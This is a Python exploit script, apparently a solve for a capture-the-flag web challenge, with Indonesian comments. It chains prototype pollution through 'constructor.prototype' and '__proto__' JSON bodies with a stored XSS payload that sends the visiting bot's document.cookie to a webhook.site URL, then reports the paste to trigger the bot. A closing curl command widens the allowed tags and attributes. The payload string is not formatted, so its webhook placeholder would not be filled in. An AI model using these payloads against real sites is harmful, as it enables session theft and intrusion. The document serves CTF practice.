import requests
import sys

# -- KONFIGURASI --
# Ganti dengan URL target dari soal CTF
TARGET_URL = "http://ctf.compfest.id:7301" # <- Sesuaikan jika berbeda
# Ganti dengan URL webhook kamu (misalnya dari webhook.site)
WEBHOOK_URL = "https://webhook.site/8edf15c9-ab71-4f8c-8717-b2c3572ae1f2" # <- GANTI INI
# -----------------

# Cek jika URL belum diubah
if "webhook.site/xxxxxxxx" in WEBHOOK_URL:
    print("❌  ERROR: Harap ganti 'WEBHOOK_URL' dengan URL webhook milikmu.")
    sys.exit(1)

# Gunakan session untuk menjaga koneksi
s = requests.Session()

# Definisikan endpoint API
api_endpoint = f"{TARGET_URL}/api/copas"

# --- Langkah 1: Polusi untuk mengizinkan <script> ---
print("[*] Langkah 1: Meracuni Object.prototype untuk mengizinkan <script>...")

pollution_payload = {
    "data": "polluting for script tag",
    "constructor": {
        "prototype": {
            "allowedTags": ["script"]
        }
    }
}

try:
    r_pollute = s.post(api_endpoint, json=pollution_payload, timeout=10)
    if r_pollute.status_code == 200:
        print("✅  Prototype berhasil diracuni untuk <script>!")
    else:
        print(f"❌  Gagal melakukan pollution. Status: {r_pollute.status_code}")
        sys.exit(1)
except requests.exceptions.RequestException as e:
    print(f"❌  Koneksi ke target gagal: {e}")
    sys.exit(1)


# --- Langkah 2: Mengirim Payload XSS BARU dengan Redirect ---
print("\n[*] Langkah 2: Mengirim payload XSS baru menggunakan window.location...")

# DIUBAH: Payload XSS sekarang me-redirect bot ke webhook kita
xss_payload_data = "<script>window.location='{WEBHOOK_URL}/?c=' + document.cookie;</script>"
xss_payload = {
    "data": xss_payload_data
}

r_xss = s.post(api_endpoint, json=xss_payload, timeout=10)
paste_id = ""

if r_xss.status_code == 200:
    paste_id = r_xss.json().get('id')
    print(f"✅  Payload XSS Redirect berhasil dikirim! ID Paste: {paste_id}")
else:
    print(f"❌  Gagal mengirim payload XSS. Status: {r_xss.status_code}")
    sys.exit(1)

# --- Langkah 3: Memicu Bot ---
print(f"\n[*] Langkah 3: Melaporkan paste ({paste_id}) agar bot berkunjung...")

report_endpoint = f"{TARGET_URL}/api/copas/report/{paste_id}"
r_report = s.post(report_endpoint, timeout=15) 

if r_report.status_code == 200:
    print("✅  Bot berhasil dipicu!")
else:
    print(f"❌  Gagal memicu bot. Status: {r_report.status_code}")
    sys.exit(1)

print("\n🎉  Selesai! Segera periksa log di webhook-mu. Jika berhasil, bot akan dialihkan ke sana.")




curl -X POST http://ctf.compfest.id:7301/api/copas \
  -H "Content-Type: application/json" \
  -d '{
    "data": "<script>alert(1)</script>",
    "__proto__": {
      "allowedTags": ["script", "img", "iframe"],
      "allowedAttributes": {
        "script": ["src"],
        "img": ["src", "onerror"],
        "iframe": ["src"]
      }
    }
  }'